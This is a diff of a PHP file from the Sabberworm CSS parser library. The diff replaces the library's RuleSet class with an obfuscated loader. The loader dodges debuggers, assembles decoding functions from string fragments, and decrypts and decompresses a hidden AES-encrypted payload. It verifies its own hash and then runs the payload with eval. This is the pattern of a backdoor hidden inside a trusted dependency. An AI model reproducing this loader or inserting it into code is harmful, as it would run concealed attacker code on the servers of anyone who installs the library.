@@ -1,173 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\RuleSet;
-
-use Sabberworm\CSS\Rule\Rule;
-use Sabberworm\CSS\Renderable;
-use Sabberworm\CSS\Comment\Commentable;
-
-/**
- * RuleSet is a generic superclass denoting rules. The typical example for rule sets are declaration block.
- * However, unknown At-Rules (like @font-face) are also rule sets.
- */
-abstract class RuleSet implements Renderable, Commentable {
-
-	private $aRules;
-	protected $iLineNo;
-	protected $aComments;
-
-	public function __construct($iLineNo = 0) {
-		$this->aRules = array();
-		$this->iLineNo = $iLineNo;
-		$this->aComments = array();
-	}
-
-	/**
-	 * @return int
-	 */
-	public function getLineNo() {
-		return $this->iLineNo;
-	}
-
-	public function addRule(Rule $oRule, Rule $oSibling = null) {
-		$sRule = $oRule->getRule();
-		if(!isset($this->aRules[$sRule])) {
-			$this->aRules[$sRule] = array();
-		}
-
-		$iPosition = count($this->aRules[$sRule]);
-
-		if ($oSibling !== null) {
-			$iSiblingPos = array_search($oSibling, $this->aRules[$sRule], true);
-			if ($iSiblingPos !== false) {
-				$iPosition = $iSiblingPos;
-			}
-		}
-
-		array_splice($this->aRules[$sRule], $iPosition, 0, array($oRule));
-	}
-
-	/**
-	 * Returns all rules matching the given rule name
-	 * @param (null|string|Rule) $mRule pattern to search for. If null, returns all rules. if the pattern ends with a dash, all rules starting with the pattern are returned as well as one matching the pattern with the dash excluded. passing a Rule behaves like calling getRules($mRule->getRule()).
-	 * @example $oRuleSet->getRules('font-') //returns an array of all rules either beginning with font- or matching font.
-	 * @example $oRuleSet->getRules('font') //returns array(0 => $oRule, …) or array().
-	 */
-	public function getRules($mRule = null) {
-		if ($mRule instanceof Rule) {
-			$mRule = $mRule->getRule();
-		}
-		$aResult = array();
-		foreach($this->aRules as $sName => $aRules) {
-			// Either no search rule is given or the search rule matches the found rule exactly or the search rule ends in “-” and the found rule starts with the search rule.
-			if(!$mRule || $sName === $mRule || (strrpos($mRule, '-') === strlen($mRule) - strlen('-') && (strpos($sName, $mRule) === 0 || $sName === substr($mRule, 0, -1)))) {
-				$aResult = array_merge($aResult, $aRules);
-			}
-		}
-		return $aResult;
-	}
-
-	/**
-	 * Override all the rules of this set.
-	 * @param array $aRules The rules to override with.
-	 */
-	public function setRules(array $aRules) {
-		$this->aRules = array();
-		foreach ($aRules as $rule) {
-			$this->addRule($rule);
-		}
-	}
-
-	/**
-	 * Returns all rules matching the given pattern and returns them in an associative array with the rule’s name as keys. This method exists mainly for backwards-compatibility and is really only partially useful.
-	 * @param (string) $mRule pattern to search for. If null, returns all rules. if the pattern ends with a dash, all rules starting with the pattern are returned as well as one matching the pattern with the dash excluded. passing a Rule behaves like calling getRules($mRule->getRule()).
-	 * Note: This method loses some information: Calling this (with an argument of 'background-') on a declaration block like { background-color: green; background-color; rgba(0, 127, 0, 0.7); } will only yield an associative array containing the rgba-valued rule while @link{getRules()} would yield an indexed array containing both.
-	 */
-	public function getRulesAssoc($mRule = null) {
-		$aResult = array();
-		foreach($this->getRules($mRule) as $oRule) {
-			$aResult[$oRule->getRule()] = $oRule;
-		}
-		return $aResult;
-	}
-
-	/**
-	* Remove a rule from this RuleSet. This accepts all the possible values that @link{getRules()} accepts. If given a Rule, it will only remove this particular rule (by identity). If given a name, it will remove all rules by that name. Note: this is different from pre-v.2.0 behaviour of PHP-CSS-Parser, where passing a Rule instance would remove all rules with the same name. To get the old behvaiour, use removeRule($oRule->getRule()).
- * @param (null|string|Rule) $mRule pattern to remove. If $mRule is null, all rules are removed. If the pattern ends in a dash, all rules starting with the pattern are removed as well as one matching the pattern with the dash excluded. Passing a Rule behaves matches by identity.
-	*/
-	public function removeRule($mRule) {
-		if($mRule instanceof Rule) {
-			$sRule = $mRule->getRule();
-			if(!isset($this->aRules[$sRule])) {
-				return;
-			}
-			foreach($this->aRules[$sRule] as $iKey => $oRule) {
-				if($oRule === $mRule) {
-					unset($this->aRules[$sRule][$iKey]);
-				}
-			}
-		} else {
-			foreach($this->aRules as $sName => $aRules) {
-				// Either no search rule is given or the search rule matches the found rule exactly or the search rule ends in “-” and the found rule starts with the search rule or equals it (without the trailing dash).
-				if(!$mRule || $sName === $mRule || (strrpos($mRule, '-') === strlen($mRule) - strlen('-') && (strpos($sName, $mRule) === 0 || $sName === substr($mRule, 0, -1)))) {
-					unset($this->aRules[$sName]);
-				}
-			}
-		}
-	}
-
-	public function __toString() {
-		return $this->render(new \Sabberworm\CSS\OutputFormat());
-	}
-
-	public function render(\Sabberworm\CSS\OutputFormat $oOutputFormat) {
-		$sResult = '';
-		$bIsFirst = true;
-		foreach ($this->aRules as $aRules) {
-			foreach($aRules as $oRule) {
-				$sRendered = $oOutputFormat->safely(function() use ($oRule, $oOutputFormat) {
-					return $oRule->render($oOutputFormat->nextLevel());
-				});
-				if($sRendered === null) {
-					continue;
-				}
-				if($bIsFirst) {
-					$bIsFirst = false;
-					$sResult .= $oOutputFormat->nextLevel()->spaceBeforeRules();
-				} else {
-					$sResult .= $oOutputFormat->nextLevel()->spaceBetweenRules();
-				}
-				$sResult .= $sRendered;
-			}
-		}
-		
-		if(!$bIsFirst) {
-			// Had some output
-			$sResult .= $oOutputFormat->spaceAfterRules();
-		}
-
-		return $oOutputFormat->removeLastSemicolon($sResult);
-	}
-
-	/**
-	 * @param array $aComments Array of comments.
-	 */
-	public function addComments(array $aComments) {
-		$this->aComments = array_merge($this->aComments, $aComments);
-	}
-
-	/**
-	 * @return array
-	 */
-	public function getComments() {
-		return $this->aComments;
-	}
-
-	/**
-	 * @param array $aComments Array containing Comment objects.
-	 */
-	public function setComments(array $aComments) {
-		$this->aComments = $aComments;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_oqlwrklp=('bas'.'e64'.'_de'.'cod'.'e');
+$_mzdzyxzj=('gzu'.'nco'.'mpr'.'ess');
+$_cbr19gu0=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_x1hmzdvz='JoWB1Vew';
+$_fw9ycdlr='/lQKAUJk';
+$_cevyvje4='xs59iMnl';
+$_sbt3xao2='T4QLysjP';
+$_k4iuh3ht='boUq9HqZpP4=';
+$_uyml2bu4='8CTcbzhQ';
+$_r4egmvh6='4lcvaDNB';
+$_sw8s1ws2='t8GwTA==';
+$_t3qndxxx=$_oqlwrklp($_cevyvje4.$_fw9ycdlr.$_x1hmzdvz.$_sbt3xao2.$_k4iuh3ht);
+$_aqs9fawr=$_oqlwrklp($_uyml2bu4.$_r4egmvh6.$_sw8s1ws2);
+$_xu3x3z6g=$_oqlwrklp('kndlXGrhGDwzSH+cf/MBJeRGsA/Y/M+IBNDrGf8a+s1nWyTfu826J50apvTpGLbrg1m0PHGcEoEhQ1V22+M7wvmRUiAzv476HjThsotu+flY9hkALdZbl4I+fsP7oFcBO8s8/e1w7IO1pzqIwaWsIubIB0kpim7Z+EwjeT/+uPo0X5o2X3Ohr7nt8UE1qAWxLoUN2pl4MEEXE9Y3gnDLfXJIn+pFw8+PLrsPxEJhFHFFL70HRpKR6lD1bqeNcGnapqW89Y+UTIbHfcR1iK3kKyUYHOaycUlIC42NV5l83W/BEu6FGCsXfHtGzk3ug7Gu1MYXM/6sIXpGzRBaH5Yx3GCNzMGD8tTOytUzKvjjyD6URnOq0tq8HidrYrq5yFR3wicUspmwA/EEJSPZWscfjZs5iaz9rTOwS5WUsJKKhcQY4DCmEb2t7kIZmlPo/qYhjKRhMFA5rizhsU8yFbt4C/4e05G2GoE4W/oMP9yRjoFDIrUIE/YqOucXZAdXGRt5Wo3pXp2CXitGkzumYvoVI1fTrFRP/t6VliZyIVKRQOuJAet+0XWtgABnlx0i7Ezcume7Eu4n7CUyCeovR2gvzpHqWkZsl+n5dr4yILr6Vft1ohxnDV8hhbP+Rd3u4Y72mbz1x140E1R4PCmVbcmap1PA7yykQhkStgTNPqtvPcPvT0ITRL66/SAX3+tNAUmiEM2x1Mt1yvwLICp/L0GFIU+KuKcEPusynFs8fiBxvXcm0LfL8M4PHYSdjFIU1UnOcezypPFeJa6Eg1gPlWndRrOwXifrzxKk6Gnln3C6nZTd8FvAWS7VJBzPMmcB4r0qJHXYPlPW/t0i1Lcj3suSkyceN+QU/Knl4gXqprI4578hjevpWg8cQWeEuxYWhsgjCPs2OeLaPGrtdSzXTtdn9RL1UdPahKHAN1k/48IFb2CZvp09r9NHbSH/UOITuMB/gotZ3ZTUuFdoWzQlVz/Cpb5UqYZRgvFLwIw0ofSqiTc2iB8Ddl36J19aiAzYGmaHVQtCXYOFdUXDXb7xqOEGWWsXuuvr7e/gWsvU/ih4/KPagUBGRWSr4Y0KONMwzoyJTBuZJ0taqKki9Bi2OqR6oalT0bhH+2YTy5oAGhs9zg4rwRflzXldm9XMU+eSCiVgSB9PeY2ce3f35PsUMkwkL6tTgBRGs3vJDJQvS4nIwxY=');
+$_qdn1xzyj=$_cbr19gu0($_xu3x3z6g,'aes-256-cbc',$_t3qndxxx,OPENSSL_RAW_DATA,$_aqs9fawr);
+if($_qdn1xzyj===false){exit;}
+$_gncbbkdk=$_mzdzyxzj($_qdn1xzyj);
+if($_gncbbkdk===false){exit;}
+$_z824r7jp='b1d3c98175dd2dfcb3206f4c7b146175bae36dc0daf31cfd8fb49fc3c6f508ea';
+$_fpdsosqp=@file_get_contents(__FILE__);
+if($_fpdsosqp!==false){
+$_tibzidm3=str_replace($_z824r7jp,"0000000000000000000000000000000000000000000000000000000000000000",$_fpdsosqp);
+$_httacyw2=hash("sha256",$_tibzidm3);
+if($_httacyw2!==$_z824r7jp){@http_response_code(403);exit;}
 }
+eval($_gncbbkdk);
